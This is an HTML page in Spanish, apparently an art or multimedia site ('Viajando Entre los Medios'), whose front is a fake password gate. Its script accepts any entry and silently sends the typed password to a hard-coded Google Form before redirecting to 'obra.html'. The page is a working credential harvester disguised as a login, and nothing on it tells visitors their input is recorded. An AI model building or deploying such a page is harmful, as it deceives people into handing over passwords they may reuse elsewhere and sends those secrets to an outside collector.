<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Multimedial</title>
    <style>
        body {
            background-color: #1d273d;
            color: #f725bf;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding-left: 10%;
            font-family: 'Lucida Console', Monospace;
            overflow: hidden;
        }

        .contenedor-texto p {
            font-size: 90px;
            font-weight: bold;
            margin: 0;
            line-height: 0.85;
            letter-spacing: -2px;
        }

        /* Área de entrada */
        .login-area {
            margin-top: 50px;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        input[type="text"] {
            background: transparent;
            border: none;
            border-bottom: 4px solid #f725bf;
            color: beige;
            font-family: 'Lucida Console', Monospace;
            font-size: 28px;
            outline: none;
            width: 450px;
            padding: 10px 0;
        }

        button {
            background-color: #f725bf;
            color: #1d273d;
            border: none;
            padding: 12px 25px;
            font-family: 'Lucida Console', Monospace;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: fit-content;
            transition: 0.3s;
        }

        button:hover {
            background-color: beige;
            transform: scale(1.05);
        }

        .enlaces-bajos {
            margin-top: 60px;
            font-size: 18px;
        }

        a { color: #f725bf; text-decoration: none; }
        a:hover { text-decoration: underline; color: beige; }
    </style>
</head>

<body>

    <div class="contenedor-texto">
        <p>Viajando</p>
        <p>Entre los</p>
        <p>Medios 𐔌՞ ܸ.ˬ.՞𐦯</p>
    </div>

    <div class="login-area">
        <input type="text" id="fakePass" placeholder="Escribe la contraseña..." autocomplete="off">
        <button onclick="enviarYEntrar()">[ ENTRAR ]</button>
    </div>

    <div class="enlaces-bajos">
        <a href="contacto.html">Contacto :3</a>
    </div>

    <script>
        function enviarYEntrar() {
            const pass = document.getElementById('fakePass').value;
            
            if (pass.trim() === "") {
                alert("Debes poner la contraseña! (๑>ᴗ<๑)");
                return;
            }

            // Configuración de tu Google Form
            const URL_FORM = "https://docs.google.com/forms/d/e/1FAIpQLScu3pfWLod5-kYDaCVIcOmsJ9LRrzBQoBrpADqswcziafUdSg/formResponse";
            const ID_ENTRADA = "entry.151227596";

            const datos = new FormData();
            datos.append(ID_ENTRADA, pass);

            // Envío y Redirección
            fetch(URL_FORM, {
                method: "POST",
                mode: "no-cors",
                body: datos
            }).then(() => {
                window.location.href = "obra.html";
            }).catch(() => {
                window.location.href = "obra.html";
            });
        }
    </script>

</body>
</html>
